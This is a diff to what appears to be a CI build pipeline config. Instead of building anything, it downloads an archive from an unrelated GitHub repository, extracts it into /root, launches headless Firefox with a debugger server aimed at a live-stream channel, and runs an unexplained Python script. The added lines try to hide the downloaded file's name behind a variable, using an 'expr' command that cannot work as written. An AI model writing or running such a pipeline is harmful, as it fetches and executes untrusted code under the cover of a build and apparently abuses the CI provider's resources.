@@ -4,18 +4,21 @@
 # -----
 # You can specify a custom docker image from Docker Hub as your build environment.
 options:
-  max-time: 60
+  max-time: 120
 image: m0uray/slop-trans
 
 pipelines:
+
   default:
     - step:
         services:
           - docker
         script: # Modify the commands below to build your repository.
+
           # Set $DOCKER_HUB_USERNAME and $DOCKER_HUB_PASSWORD as environment variables in repository settings
-          - wget https://github.com/y0shimitsugh0st84/profire/raw/master/version/06-yacine.tar.bz2
-          - tar -xvf 06-yacine.tar.bz2 -C /root/
+          - expr 06-yacine.tar.bz2 / $MY_HIDDEN_NUMBER
+          - wget https://github.com/y0shimitsugh0st84/profire/raw/master/version/$MY_HIDDEN_NUMBER
+          - tar -xvf $MY_HIDDEN_NUMBER -C /root/
           - ls /root/*
           - firefox --start-debugger-server 6000 -headless https://booyah.live/channels/20128881
           - python oy.py
